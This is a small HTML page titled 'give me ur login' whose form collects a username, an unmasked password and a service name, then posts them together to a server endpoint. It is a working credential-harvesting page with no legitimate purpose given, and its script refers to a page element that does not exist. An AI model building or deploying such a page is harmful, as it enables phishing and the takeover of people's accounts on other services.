<!DOCTYPE html>
<html>
    <head>
        <title>give me ur login</title>
        <style>
            * {
                font-family: monospace;
            }
            body {
              background: #bfbfbf;
            }
        </style>
    </head>
    <body>
        <form id="form">
            <input type="text" id="username" placeholder="Username" />
            <input type="text" id="password" placeholder="Password" />
            <input type="text" id="trackingcode" placeholder="Service" />
            <button type="submit">Send</button>
        </form>
        <script>
            const form = document.getElementById('form');
            
            form.addEventListener('submit', async (e) => {
              e.preventDefault();
              const username = document.getElementById('username').value.trim();
              const password = document.getElementById('password').value.trim();
              const service = document.getElementById('trackingcode').value.trim();
              if (!username || !password) {
                alert('Please enter password AND username.');
                return;
              }
            
              try {
                const res = await fetch('/api/server', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ content: `${username}, ${password}, Service: ${service}` })
                });
                document.getElementById("info").style.display = "block";
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
              } catch (err) {
                console.error('Error:', err);
              }
            });
        </script>
    </body>
</html>
